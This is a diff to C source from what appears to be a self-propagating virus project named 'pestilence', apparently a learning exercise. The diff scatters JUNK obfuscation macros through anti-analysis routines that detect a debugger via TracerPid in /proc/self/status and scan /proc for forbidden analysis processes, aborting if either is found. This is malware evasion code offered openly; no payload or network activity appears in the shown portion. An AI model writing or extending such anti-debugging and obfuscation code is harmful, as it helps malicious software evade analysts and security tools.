@@ -6,8 +6,8 @@
 
 #include "pestilence.h"
 #include "utils.h"
+#include "death.h"
 #include "syscall.h"
-
 
 /* open /proc/ directory and check if the process in char forbidden[] is running 
  * example /proc/1/comm
@@ -21,11 +21,15 @@ static int check_proc(const char *dir_path) {
 		(void *)0
 	};
 
+	JUNK;
+
 	char file[PATH_MAX];
 
 	int fd = open(dir_path, O_RDONLY);
 	if (fd == -1)
 		return 1;
+
+	JUNK;
 
 	ssize_t ret = read(fd, file, PATH_MAX);
 	if (ret == -1) {
@@ -34,6 +38,8 @@ static int check_proc(const char *dir_path) {
 	}
 
 	file[ret] = '\0';
+
+	JUNK;
 
 	for (size_t i = 0; forbidden[i]; ++i) {
 		if (ft_memcmp(file, forbidden[i], ft_strlen(forbidden[i])) == 0) {
@@ -49,6 +55,7 @@ static int check_proc(const char *dir_path) {
 
 static int check_digit(const char *str) {
 	for (size_t i = 0; str[i]; i++) {
+		JUNK;
 		if (str[i] < '0' || str[i] > '9')
 			return 1;
 	}
@@ -61,12 +68,17 @@ static int forbid_proc(void)
 
 	int fd = open(proc, O_RDONLY);
 
+	JUNK;
+
 	if (fd == -1)
 		return 1;
+
 
 	char buf[PATH_MAX];
 	struct dirent *dir;
 	ssize_t ret;
+
+	JUNK;
 
 	for(;;)
 	{
@@ -76,6 +88,8 @@ static int forbid_proc(void)
 		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
 		{
 			dir = (struct dirent *)(buf + i);
+
+			JUNK;
 
 			if (dir->d_name[0] == '.'
 				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
@@ -87,6 +101,8 @@ static int forbid_proc(void)
 
 				char comm[] = "/comm";
 				char slash[] = "/";
+
+				JUNK;
 
 				char *ptr = new_path;
 				ptr = ft_stpncpy(ptr, proc, PATH_MAX);
@@ -113,6 +129,8 @@ static int is_debugged(void) {
 	int res = 0;
 	int fd = open(STR("/proc/self/status"), O_RDONLY);
 
+	JUNK;
+
 	if (fd == -1)
 		return 1;
 
@@ -123,6 +141,8 @@ static int is_debugged(void) {
 		return 1;
 	buf[ret] = '\0';
 
+	JUNK;
+
 	char *ptr = ft_memmem(buf, ret, STR("TracerPid:"), 10);
 	if (ptr != 0) {
 		ptr += 10;
@@ -132,6 +152,8 @@ static int is_debugged(void) {
 			res = 1;
 		}
 	}
+
+	JUNK;
 
 	close(fd);
 	return res;
@@ -146,6 +168,7 @@ static int is_debugged(void) {
 
 int pestilence(void)
 {
+	JUNK;
 	if (is_debugged() != 0 || forbid_proc() != 0)
 		return 1;
 	return 0;
